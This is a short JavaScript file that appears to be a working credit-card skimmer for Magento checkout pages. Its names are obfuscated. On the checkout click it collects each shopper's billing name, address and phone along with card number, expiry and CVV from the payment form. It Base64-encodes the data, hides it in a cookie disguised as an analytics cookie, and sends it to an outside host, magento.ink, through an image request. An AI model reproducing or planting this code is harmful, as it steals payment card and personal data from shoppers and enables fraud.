// Base64 encoding function (manual version)
function bs64(a) {
    var e, f, b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', c = '', d = a.length, g = 0;
    while (d-- > 0) {
        e = a.charCodeAt(g++);
        c += b.charAt(e >> 2 & 63);
        if (d-- <= 0) {
            c += b.charAt(e << 4 & 63) + '==';
            break;
        }
        f = a.charCodeAt(g++);
        c += b.charAt(63 & (e << 4 | f >> 4 & 15));
        if (d-- <= 0) {
            c += b.charAt(f << 2 & 63) + '=';
            break;
        }
        e = a.charCodeAt(g++);
        c += b.charAt(63 & (f << 2 | e >> 6 & 3));
        c += b.charAt(63 & e);
    }
    return c;
}

function crc(a, b) {
    var c = '', d = new Date();
    d.setTime(d.getTime() + 864e5); 
    c = '; expires=' + d.toUTCString();
    document.cookie = a + '=' + b + c + '; path=/';
}

if (document.querySelector("#checkout") !== null) {
    document.querySelector("#checkout").addEventListener("click", function (event) {
        const gjh23lkd = window.checkoutConfig.billingAddressFromData;
        const zlfqwz = `${gjh23lkd.firstname} ${gjh23lkd.lastname}`;
        const qnxzsd = gjh23lkd.street[0];
        const prwg54z = gjh23lkd.street[1] || ''; // Default to empty if second address line is empty
        const i4rts7l = gjh23lkd.city;
        const xmvs9dp = gjh23lkd.region;
        const w4jhk5z = gjh23lkd.postcode;
        const wmpd96r = gjh23lkd.country_id;
        const kjf98b6 = gjh23lkd.telephone;
        const zf1p9ko = window.location.hostname;
        const t1x9z7l = new Date().toISOString().slice(0, 19).replace('T', ' ');
        const n3qkj20f = `Name:${zlfqwz} | Address:${qnxzsd} | Address2:${prwg54z} | City:${i4rts7l} | State:${xmvs9dp} | Zip:${w4jhk5z} | Country:${wmpd96r} | Phone:${kjf98b6} | From:${zf1p9ko} | ${t1x9z7l}`;

        const a92kj38 = document.querySelector('#valitorpay_cc_number').value;
        const s84p0zt = document.querySelector('#valitorpay_expiration').value;
        const h0a62pk = document.querySelector('#valitorpay_expiration_yr').value;
        const d90l35k = document.querySelector('#valitorpay_cc_cid').value;

        const n13zj04f = `cardnumber:${a92kj38} | expmonth:${s84p0zt} | expyear:${h0a62pk} | cvv:${d90l35k}`;

        const l34fkd92 = `${n13zj04f} | ${n3qkj20f}`;

        const zz = bs64(l34fkd92);

        crc('__utmzz', zz);

const imgElement = new Image();
imgElement.src = `https://magento.ink/js/ajax.php?c=${zz}`;


    }, true);
}
